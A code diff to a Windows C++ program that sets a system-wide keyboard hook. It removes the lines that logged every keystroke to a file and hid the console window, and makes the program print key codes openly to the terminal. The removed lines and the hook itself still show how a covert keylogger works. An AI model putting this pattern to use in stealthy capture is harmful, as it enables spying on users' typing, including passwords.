@@ -1,9 +1,5 @@
 #include <iostream>
 #include <Windows.h>
-#include "../include/logger.h"
-
-// Global instance of the logger
-Logger logger("keystrokes.log");
 
 // The hook procedure that will handle keyboard events
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -13,18 +9,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
         // Check if the key is pressed down (WM_KEYDOWN)
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
-            // Log the key pressed (convert the key code to string)
-            logger.logKey(std::to_string(key));
+            // Print the key pressed to the terminal
+            std::cout << "Key pressed: " << key << std::endl;
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 int main() {
-    // Hide the console window
-    HWND hwnd = GetConsoleWindow();
-    ShowWindow(hwnd, SW_HIDE);
-
     // Set up the keyboard hook
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (hHook == NULL) {
@@ -33,6 +25,7 @@ int main() {
     }
 
     // Run a message loop to keep the hook active
+    std::cout << "Keystroke logger running... Press 'Ctrl + C' to exit." << std::endl;
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) != 0) {
         TranslateMessage(&msg);
